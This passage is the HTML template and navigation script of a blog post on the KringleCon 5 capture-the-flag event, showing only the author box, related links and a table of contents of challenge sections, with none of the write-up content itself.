        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fnoobintheshell.com%2fposts%2fkringlecon5%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
        </a>
      
    
  </div>
</div>


    
    
<div class="whoami__gutter"></div>
<hr class="hr-slash whoami-hr"/>
<section class="whoami">
  <div class="whoami__image-wrapper">
    
    
      
        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="Avatar" class="lazyload whoami__image"/>
      
    
  </div>
  <div class="whoami__contents">
    <div class="whoami__written-by">
      WRITTEN BY
    </div>
    <div class="whoami__title">
      
        noobintheshell
      
    </div>
    <div class="whoami__desc">
      
        AppSec Engineer and CTFer
      
    </div>
    <div class="whoami__social">
      
      
      
      
      
      
      
      
      <a href="javascript:location.href%20=%20%27mailto:%27%20&#43;%20[%27noobintheshell%27,%27protonmail.com%27].join%28%27@%27%29" title="email" aria-label="email">
        <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm-.4 4.25l-7.07 4.42c-.32.2-.74.2-1.06 0L4.4 8.25c-.25-.16-.4-.43-.4-.72 0-.67.73-1.07 1.3-.72L12 11l6.7-4.19c.57-.35 1.3.05 1.3.72 0 .29-.15.56-.4.72z"/></svg>
      </a>
      
      
      
      
      
      
      
      <a href="https://github.com/noobintheshell" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://twitter.com/noobintheshell_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
    </div>
  </div>
</section>
<hr class="hr-slash whoami-hr" />


    <section class="related">
    
    
    <h1 class="related__title">
      <hr class="hr-dots"/>
      <div>
        See Also
      </div>
      <hr class="hr-dots"/>
    </h1>
    <ul class="related-ul">
        
        <li>
          <a href="/posts/kringlecon4/" class="related__link">KringleCon 4: Calling Birds</a>
        </li>
        
        <li>
          <a href="/posts/kringlecon3/" class="related__link">KringleCon 3: Three French Hens</a>
        </li>
        
    </ul>
    
  </section>
    <div class="grow"></div>
<nav class="pagination-single">
  
    
      <a href="https://noobintheshell.com/posts/kringlecon4/" class="pagination-single__left">
        <div class="pagination-single__icon">
          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/></svg>
        </div>
        <div class="pagination-single__left-title">KringleCon 4: Calling Birds</div>      
      </a>
    
    <div class="grow"></div>
    
  
</nav>
    
  
    <div id="disqus_thread"></div>
<script>
  let disqus_config = function () {
    
    
    
  };
  (function () {
    if (["127.0.0.1"].indexOf(window.location.hostname) != -1) {
      document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
      return;
    }
    var d = document, s = d.createElement('script'); s.async = true;
    s.src = 'https://' + 'noobintheshell' + '.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
  }) ();
</script>
  

    <div class="modal micromodal-slide" id="modal" aria-hidden="true">
  <div class="modal__overlay" tabindex="-1" data-micromodal-close>
    <div class="modal__container" role="dialog" aria-modal="true" aria-labelledby="modal-title">
      
      <div class="modal__content" id="modal-content">
        <div id="mySwipe" class="swipe">
          <div class="swipe-wrap">
          </div>
        </div>
      </div>

      <span class="modal__items">
        
        <span class="modal__header">
          <div class="modal__paging" title="Page Info" aria-label="Current Page">
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--close" title="Close" aria-label="Close Button" data-micromodal-close>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="25" height="25"><path fill="currentColor" d="M 21.734375 19.640625 L 19.636719 21.734375 C 19.253906 22.121094 18.628906 22.121094 18.242188 21.734375 L 13 16.496094 L 7.761719 21.734375 C 7.375 22.121094 6.746094 22.121094 6.363281 21.734375 L 4.265625 19.640625 C 3.878906 19.253906 3.878906 18.628906 4.265625 18.242188 L 9.503906 13 L 4.265625 7.761719 C 3.882813 7.371094 3.882813 6.742188 4.265625 6.363281 L 6.363281 4.265625 C 6.746094 3.878906 7.375 3.878906 7.761719 4.265625 L 13 9.507813 L 18.242188 4.265625 C 18.628906 3.878906 19.257813 3.878906 19.636719 4.265625 L 21.734375 6.359375 C 22.121094 6.746094 22.121094 7.375 21.738281 7.761719 L 16.496094 13 L 21.734375 18.242188 C 22.121094 18.628906 22.121094 19.253906 21.734375 19.640625 Z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--full" title="Full Screen" aria-label="Full Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="25" height="25"><path fill="currentColor" d="M 5 3 C 3.9069372 3 3 3.9069372 3 5 L 3 8 A 1.0001 1.0001 0 1 0 5 8 L 5 5 L 8 5 A 1.0001 1.0001 0 1 0 8 3 L 5 3 z M 16 3 A 1.0001 1.0001 0 1 0 16 5 L 19 5 L 19 8 A 1.0001 1.0001 0 1 0 21 8 L 21 5 C 21 3.9069372 20.093063 3 19 3 L 16 3 z M 3.984375 14.986328 A 1.0001 1.0001 0 0 0 3 16 L 3 19 C 3 20.093063 3.9069372 21 5 21 L 8 21 A 1.0001 1.0001 0 1 0 8 19 L 5 19 L 5 16 A 1.0001 1.0001 0 0 0 3.984375 14.986328 z M 19.984375 14.986328 A 1.0001 1.0001 0 0 0 19 16 L 19 19 L 16 19 A 1.0001 1.0001 0 1 0 16 21 L 19 21 C 20.093063 21 21 20.093063 21 19 L 21 16 A 1.0001 1.0001 0 0 0 19.984375 14.986328 z"/></svg>
          </div>
          <div class="modal__icon modal__toolbar modal__toolbar--normal" title="Normal Screen" aria-label="Normal Screen Button">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25"><path fill="currentColor" d="M 16.96875 4.972656 C 15.867188 4.988281 14.984375 5.894531 15 7 L 15 15 L 7 15 C 6.277344 14.988281 5.609375 15.367188 5.246094 15.992188 C 4.878906 16.613281 4.878906 17.386719 5.246094 18.007813 C 5.609375 18.632813 6.277344 19.011719 7 19 L 19 19 L 19 7 C 19.007813 6.460938 18.796875 5.941406 18.414063 5.558594 C 18.03125 5.175781 17.511719 4.964844 16.96875 4.972656 Z M 32.96875 4.972656 C 31.921875 4.988281 31.0625 5.8125 31.003906 6.859375 C 31 6.90625 31 6.953125 31 7 L 31 19 L 43 19 C 43.066406 19 43.132813 19 43.199219 18.992188 C 44.269531 18.894531 45.070313 17.972656 45.015625 16.902344 C 44.964844 15.828125 44.074219 14.988281 43 15 L 35 15 L 35 7 C 35.007813 6.460938 34.796875 5.941406 34.414063 5.558594 C 34.03125 5.175781 33.511719 4.964844 32.96875 4.972656 Z M 7 31 C 6.277344 30.988281 5.609375 31.367188 5.246094 31.992188 C 4.878906 32.613281 4.878906 33.386719 5.246094 34.007813 C 5.609375 34.632813 6.277344 35.011719 7 35 L 15 35 L 15 43 C 14.988281 43.722656 15.367188 44.390625 15.992188 44.753906 C 16.613281 45.121094 17.386719 45.121094 18.007813 44.753906 C 18.632813 44.390625 19.011719 43.722656 19 43 L 19 31 Z M 31 31 L 31 43 C 30.988281 43.722656 31.367188 44.390625 31.992188 44.753906 C 32.613281 45.121094 33.386719 45.121094 34.007813 44.753906 C 34.632813 44.390625 35.011719 43.722656 35 43 L 35 35 L 43 35 C 43.722656 35.011719 44.390625 34.632813 44.753906 34.007813 C 45.121094 33.386719 45.121094 32.613281 44.753906 31.992188 C 44.390625 31.367188 43.722656 30.988281 43 31 Z"/></svg>
          </div>
        </span>
        
        <div class="modal__icon modal__arrow modal__arrow--left" title="Arrow Left" aria-label="Arrow Left Button">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 23.28125 11 L 10 10 L 10 6.851563 C 10 6.523438 9.839844 6.277344 9.519531 6.03125 C 9.199219 5.949219 8.878906 5.949219 8.640625 6.113281 C 5.359375 8.410156 2.238281 12.257813 2.160156 12.421875 C 2.082031 12.578125 2.007813 12.8125 2.003906 12.976563 C 2.003906 12.980469 2 12.988281 2 12.992188 C 2 13.15625 2.078125 13.402344 2.160156 13.484375 C 2.238281 13.648438 5.28125 17.507813 8.640625 19.804688 C 8.960938 19.96875 9.28125 20.050781 9.519531 19.886719 C 9.839844 19.722656 10 19.476563 10 19.148438 L 10 16 L 23.28125 15 C 23.679688 14.679688 24 13.875 24 12.992188 C 24 12.195313 23.761719 11.320313 23.28125 11 Z"/></svg>
        </div>
        
        <div class="modal__icon modal__arrow modal__arrow--right" title="Arrow Right" aria-label="Arrow Right Button">

          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 26 26" width="28" height="28"><path fill="currentColor" d="M 2.71875 11.023438 L 16 10.023438 L 16 6.875 C 16 6.546875 16.160156 6.300781 16.480469 6.054688 C 16.800781 5.972656 17.121094 5.972656 17.359375 6.136719 C 20.640625 8.433594 23.761719 12.28125 23.839844 12.445313 C 23.917969 12.601563 23.992188 12.835938 23.996094 13 C 23.996094 13.003906 24 13.011719 24 13.015625 C 24 13.179688 23.921875 13.425781 23.839844 13.507813 C 23.761719 13.671875 20.71875 17.53125 17.359375 19.828125 C 17.039063 19.992188 16.71875 20.074219 16.480469 19.910156 C 16.160156 19.746094 16 19.5 16 19.171875 L 16 16.023438 L 2.71875 15.023438 C 2.320313 14.703125 2 13.898438 2 13.015625 C 2 12.21875 2.238281 11.34375 2.71875 11.023438 Z"/></svg>
        </div>

        <div class="modal__caption">
          <div class="modal__caption--text">
          </div>
        </div>

      </span>
    </div>
  </div>
</div>


<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>

<script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script>
document.addEventListener('DOMContentLoaded', function () {
  
   
  var docElem = document.documentElement;

   
  function openFullscreen() {
    if (docElem.requestFullscreen) {
      docElem.requestFullscreen();
    } else if (docElem.mozRequestFullScreen) {  
      docElem.mozRequestFullScreen();
    } else if (docElem.webkitRequestFullscreen) {  
      docElem.webkitRequestFullscreen();
    } else if (docElem.msRequestFullscreen) {  
      docElem.msRequestFullscreen();
    }
  }

   
  function closeFullscreen() {
    if (document.fullscreenElement ||
      document.webkitFullscreenElement ||
      document.mozFullScreenElement) {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } else if (document.mozCancelFullScreen) {  
        document.mozCancelFullScreen();
      } else if (document.webkitExitFullscreen) {  
        document.webkitExitFullscreen();
      } else if (document.msExitFullscreen) {  
        document.msExitFullscreen();
      }
    }
  }

  var modal = document.getElementById('modal');
  var galleryContainerElem = document.querySelector('.gallery__container');
  var swipeWrapElem = document.querySelector('.swipe-wrap');
  var mySwipeElem = document.getElementById('mySwipe');
  var arrowLeftElem = document.querySelector('.modal__arrow--left');
  var arrowRightElem = document.querySelector('.modal__arrow--right');
  var closeElem = document.querySelector('.modal__toolbar--close');
  var fullElem = document.querySelector('.modal__toolbar--full');
  var normalElem = document.querySelector('.modal__toolbar--normal');
  var captionElem = document.querySelector('.modal__caption');
  var pagingElem = document.querySelector('.modal__paging');
  var itemsElem = document.querySelector('.modal__items');
  var imgTotalNum = null;
  var myFadeTimeout = null;
  var mySwipe = null;
  var keydownFunction = function (e) {
    if (e.key === 'ArrowRight') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.next();
      }
    } else if (e.key === 'ArrowLeft') {
      if (modal && modal.classList.contains('is-open')) {
        mySwipe.prev();
      }
    }
  }

  if (galleryContainerElem) {
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  } else {
    galleryContainerElem = document.querySelector('.single__contents');
    imgTotalNum = galleryContainerElem.querySelectorAll('img').length;
  }

  MicroModal.init({
    onClose: function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
        closeFullscreen();
      }
      window.removeEventListener('keydown', keydownFunction);
    },
    disableScroll: true,
    disableFocus: true,
    awaitOpenAnimation: false,
    awaitCloseAnimation: false,
    debugMode: false,
  });

  var imageLoad = function(src) {
    return new Promise(function(resolve, reject) {
      var newImg = new Image;
      newImg.onload = function() {
        resolve(newImg);
      }
      newImg.onerror = reject;
      newImg.src = src;
    });
  }

  galleryContainerElem.querySelectorAll('img').forEach(function (elem, idx) {
    elem.style.cursor = 'pointer';

    var clonedElem = elem.cloneNode(true);
    clonedElem.style.maxHeight = '100%';
    clonedElem.style.maxWidth = '100%';
    clonedElem.onclick = function (e) {
      e.stopPropagation();
    }

    var wrapper = document.createElement('div');
    wrapper.style.width = '100%';
    wrapper.style.height = '100vh';
    wrapper.setAttribute('data-micromodal-close', '');
    wrapper.onclick = function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
    }
    wrapper.onmouseenter = function () {
      clearTimeout(myFadeTimeout);
      fadeIn(itemsElem, 200);
    };
    wrapper.onmouseleave = function () {
      myFadeTimeout = setTimeout(function () {
        fadeOut(itemsElem, 200);
      }, 2500);
    }
    wrapper.ontouchstart = function() {
      fadeIn(itemsElem, 200);
    }
    wrapper.append(clonedElem);
    swipeWrapElem.append(wrapper);

    elem.addEventListener('click', async function (e) {
      MicroModal.show('modal');
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }

      var imgSrc = e.target.getAttribute('data-src') || e.target.getAttribute('src');
      var img = await imageLoad(imgSrc);
      clonedElem.style.width = img.width + 'px';
      clonedElem.style.height = img.height + 'px';
      
      
      mySwipe = new Swipe(mySwipeElem, {
        startSlide: idx,
        draggable: true,
        autoRestart: false,
        continuous: false,
        disableScroll: true,
        stopPropagation: true,
        callback: async function (index, element) {
          
          var imgElem = element.querySelector('img');
          var imgSrc = imgElem.getAttribute('data-src') || imgElem.getAttribute('src');
          var img = await imageLoad(imgSrc);
          imgElem.style.width = img.width + 'px';
          imgElem.style.height = img.height + 'px';

          
          if (captionElem && imgElem) {
            var caption = null;
            if (imgElem.getAttribute('data-caption')) {
              caption = imgElem.getAttribute('data-caption');
            } else if (imgElem.getAttribute('title')) {
              caption = imgElem.getAttribute('title');
            } else if (imgElem.getAttribute('alt')) {
              caption = imgElem.getAttribute('alt');
            } else {
              caption = imgElem.getAttribute('src');
            }

            captionElem.querySelector('.modal__caption--text').innerText = caption;
            pagingElem.innerText = (index + 1) + ' / ' + imgTotalNum;

            clearTimeout(myFadeTimeout);
            fadeIn(itemsElem, 200);
          }
        },
      });

      fadeIn(itemsElem);

      
      if (captionElem) {
        var caption = null;
        if (e.target.getAttribute('data-caption')) {
          caption = e.target.getAttribute('data-caption');
        } else if (e.target.getAttribute('title')) {
          caption = e.target.getAttribute('title');
        } else if (e.target.getAttribute('alt')) {
          caption = e.target.getAttribute('alt');
        } else {
          caption = e.target.getAttribute('src');
        }

        captionElem.querySelector('.modal__caption--text').innerText = caption;
        pagingElem.innerText = (idx + 1) + ' / ' + imgTotalNum;
      }

      if (normalElem && fullElem) {
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
      }
    });

    window.addEventListener('keydown', keydownFunction);
  });

  arrowLeftElem ?
    arrowLeftElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.prev();
      }
    }) : null;
  arrowRightElem ?
    arrowRightElem.addEventListener('click', function (e) {
      if (mySwipe) {
        mySwipe.next();
      }
    }) : null;

  closeElem ?
    closeElem.addEventListener('click', function () {
      if (mySwipe) {
        mySwipe.kill();
        mySwipe = null;
      }
      closeFullscreen();
      MicroModal.close('modal');
    }) : null;

  fullElem ?
    fullElem.addEventListener('click', function (e) {
      openFullscreen();
      if (normalElem) {
        normalElem.style.zIndex = 25;
        normalElem.style.opacity = 1;
        fullElem.style.zIndex = -1;
        fullElem.style.opacity = 0;
      }
    }) : null;

  normalElem ?
    normalElem.addEventListener('click', function (e) {
      closeFullscreen();
      if (fullElem) {
        fullElem.style.zIndex = 25;
        fullElem.style.opacity = 1;
        normalElem.style.zIndex = -1;
        normalElem.style.opacity = 0;
      }
    }) : null;
  
});
</script>

    <div class="hide">
      
    </div>
  </div>
</main>


<aside class="single__side main-side">
  


<section class="sidebar hide">
  <script>document.querySelector('.sidebar').classList.remove('hide')</script>
  <div class="toc__flexbox" data-position="fixed">
    <h6 class="toc__title" data-ani="true">What&#39;s on this Page</h6>
    
  </div>
  <div class="toc " data-dir="ltr" data-folding="true" data-ani="true">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li>
          <ul>
            <li></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#objectives">Objectives</a>
      <ul>
        <li><a href="#1---recover-the-tolkien-ring">1 - Recover the Tolkien Ring</a>
          <ul>
            <li><a href="#11-wireshark-practice">1.1 Wireshark Practice</a></li>
            <li><a href="#12-windows-event-logs">1.2 Windows Event Logs</a></li>
            <li><a href="#13-suricata-regatta">1.3 Suricata Regatta</a></li>
          </ul>
        </li>
        <li><a href="#2---recover-the-elfen-ring">2 - Recover the Elfen Ring</a>
          <ul>
            <li><a href="#21-clone-with-a-difference">2.1 Clone with a Difference</a></li>
            <li><a href="#22-prison-escape">2.2 Prison Escape</a></li>
            <li><a href="#23-jolly-cicd">2.3 Jolly CI/CD</a></li>
          </ul>
        </li>
        <li><a href="#3---recover-the-web-ring">3 - Recover the Web Ring</a>
          <ul>
            <li><a href="#31-boria-pcap-mining">3.1 Boria PCAP Mining</a></li>
            <li><a href="#32-open-boria-mine-door">3.2 Open Boria Mine Door</a></li>
            <li><a href="#33-glamtariels-fountain">3.3 Glamtariel&rsquo;s Fountain</a></li>
          </ul>
        </li>
        <li><a href="#4---recover-the-cloud-ring">4 - Recover the Cloud Ring</a>
          <ul>
            <li><a href="#41-aws-cli-intro">4.1 AWS CLI Intro</a></li>
            <li><a href="#42-trufflehog-search">4.2 Trufflehog Search</a></li>
            <li><a href="#43-exploitation-via-aws-cli">4.3 Exploitation via AWS CLI</a></li>
          </ul>
        </li>
        <li><a href="#5---recover-the-burning-ring-of-fire">5 - Recover the Burning Ring of Fire</a>
          <ul>
            <li><a href="#51-buy-a-hat">5.1 Buy a Hat</a></li>
            <li><a href="#52-blockchain-divination">5.2 Blockchain Divination</a></li>
            <li><a href="#53-exploit-a-smart-contract">5.3 Exploit a Smart Contract</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#loot-boxes">Loot Boxes</a></li>
    <li><a href="#christmas-eggs">Christmas Eggs</a></li>
    <li><a href="#resources">Resources</a>
      <ul>
        <li>
          <ul>
            <li></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</section>



</aside>

<script>
  
  
  

  var enableToc = JSON.parse("true");
  var toc = JSON.parse("null");
  var tocPosition = JSON.parse("\"inner\"");
  
  var singleMainElem = document.querySelector('.single__main');
  var singleSideElem = document.querySelector('.single__side');

  enquire.register("screen and (max-width: 769px)", {
    match: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        if (singleMainElem && singleSideElem) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
          singleSideElem.classList.remove('main-side');
          singleSideElem.classList.add('hide');
        }
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }
    },
    unmatch: function () {
      if ((enableToc || toc) && tocPosition !== "outer") {
        singleMainElem.classList.remove('main');
        singleMainElem.classList.add('main-main');
        singleSideElem.classList.remove('hide');
        singleSideElem.classList.add('main-side');
      } else if (tocPosition === "outer") {
        if (singleMainElem && !singleMainElem.classList.contains('main-main')) {
          singleMainElem.classList.remove('main-main');
          singleMainElem.classList.add('main');
        }
        if (singleSideElem && !singleSideElem.classList.contains('hide')) {
          singleSideElem.classList.add('hide');
        }
      }

      var navCollapseBtn = document.querySelector('.navbar__burger');
      var navCollapse = document.getElementsByClassName('navbarm__collapse')[0];
      if (navCollapse) {
        navCollapse.setAttribute('data-open', false);
        navCollapse.style.maxHeight = 0;
        navCollapseBtn.classList.remove('is-active');
      }
      document.getElementsByClassName('navbar__menu')[0].classList.remove('is-active');
      document.getElementsByClassName('mobile-search')[0].classList.add('hide');
    },
    setup: function () { },
    deferSetup: true,
    destroy: function () { },
  });
</script>





<script defer src="/js/helper/getParents.min.js"></script>

<script defer src="/js/helper/closest.min.js"></script>

<script defer src="/js/helper/prev.min.js"></script>

<script defer src="/js/helper/prop.min.js"></script>

<script defer src="/js/helper/fadeinout.min.js"></script>

<script defer src="/js/helper/throttle.min.js"></script>



















































<script>
  'use strict';

  window.onload = function() {
    var navbar = document.querySelector('.navbar');
    var singleContentsElem = document.querySelector('.single__contents');

    
    
    
    var enableBusuanzi = JSON.parse("false");
    var busuanziPagePV = JSON.parse("true");
    
    if (enableBusuanzi && busuanziPagePV) {
      var pagePvElem = document.querySelector('#busuanzi_value_page_pv');
      pagePvElem.textContent = pagePvElem.textContent.replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
    }    
    



    
    
    
    
    
    
    var enableToc = JSON.parse("true");
    var toc = JSON.parse("null");
    var hideToc = JSON.parse("false");
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var tocFolding = JSON.parse("true");
    
    if ((enableToc || toc) && document.querySelector('.toc')) {
      var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');

      tableOfContentsElem.onmouseenter = function() {
        if (navbar.classList.contains('scrolling')) {
          navbar.classList.remove('scrolling');
        }
      }

      tableOfContentsElem.onmouseleave = function() {
        if (!navbar.classList.contains('scrolling')) {
          navbar.classList.add('scrolling');
        }
      }

      if (false === tocFolding) {

      } else {
        tableOfContentsElem.querySelectorAll('ul') ?
          tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
            rootUl.querySelectorAll('li').forEach(function (liElem) {
              liElem.querySelectorAll('ul').forEach(function (ulElem) {
                ulElem.style.display = 'none';
              });
            });
          }) : null;
      }

      if (tableOfContentsElem) {
        if (tableOfContentsElem.querySelectorAll('a').length > 0) {
          tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
            elem.addEventListener('click', function () {
              var id = elem.getAttribute('id');

              if (!navbar.classList.contains('scrolling')) {
                navbar.classList.remove('navbar--show');
                navbar.classList.remove('navbar--hide');
                navbar.classList.add('navbar--hide');
              }
              
              document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                elem.classList.remove('active');
              });
              elem.classList.add('active');

              var curElem = tableOfContentsElem.querySelector('[href="#' + id + '"]');
              if (curElem && curElem.nextElementSibling) {
                curElem.nextElementSibling.style.display = 'block';
              }
              if (curElem) {
                getParents(curElem, 'ul') ?
                  getParents(curElem, 'ul').forEach(function (elem) {
                    elem.style.display = 'block';
                  }) : null;
              }
            });
          });
        } else {
          if (tocFlexbox) {
            tocFlexbox.setAttribute('data-position', '');
            if (!tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
          }
          if (tocFlexboxOuter) {
            tocFlexboxOuter.setAttribute('data-position', '');
            if (!tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
        }
      }

      
      var toggleTocElem = document.getElementById("toggle-toc");
      var visibleTocElem = document.getElementById('visible-toc');
      var tocElem = document.querySelector('.toc');
      var mainElem = document.querySelector('main');
      var sideElem = document.querySelector('side');
      var tocFlexboxElem = document.querySelector('.toc__flexbox');

      toggleTocElem ? 
      toggleTocElem.addEventListener('change', function(e) {
        if (e.target.checked) {
          if (tocElem) {
            fadeIn(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'fixed');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main-main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        } else {
          if (tocElem) {
            fadeOut(tocElem, 200);
          }
          if (tocFlexboxElem) {
            tocFlexboxElem.setAttribute('data-position', 'absolute');
          }

          if (mainElem) {
            mainElem.classList.remove('main-main');
            mainElem.classList.remove('main');
            mainElem.classList.add('main');
          }
          if (sideElem) {
            sideElem.classList.remove('main-side');
          }
        }
      }) : null;

      visibleTocElem ?
      visibleTocElem.addEventListener('change', function(e) {
